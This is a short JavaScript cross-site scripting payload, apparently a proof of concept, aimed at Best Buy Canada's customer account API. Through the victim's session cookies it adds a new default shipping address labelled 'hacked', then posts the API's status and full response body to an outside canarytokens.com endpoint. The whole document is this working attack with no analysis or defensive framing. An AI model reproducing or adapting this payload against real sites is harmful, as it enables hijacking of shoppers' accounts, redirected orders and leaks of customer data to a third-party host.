function addAddressViaXSS() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://www.bestbuy.ca/api/account/v2/customers/%7B024044ee-ad29-4f5a-8feb-2a9a7820f5d9%7D/addresses", true);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-Type", "application/vnd.bestbuy+json");

  xhr.onload = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send(
      "status=" + encodeURIComponent(xhr.status) +
      "&response=" + encodeURIComponent(xhr.responseText)
    );
  };

  xhr.onerror = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send("error=network_or_cors_error");
  };

  xhr.send(JSON.stringify({
    "addressLine1": "St-780 Spence Ave",
    "city": "Hawkesbury",
    "countryCode": "CA",
    "countryName": "Canada",
    "firstName": "hacked",
    "isDefaultAddress": true,
    "lastName": "leos",
    "postalCode": "K6A 3H9",
    "primaryPhoneNumber": "2012101451",
    "regionCode": "ON",
    "regionName": "Ontario",
    "addressType": "SHIPPING"
  }));
}

addAddressViaXSS();
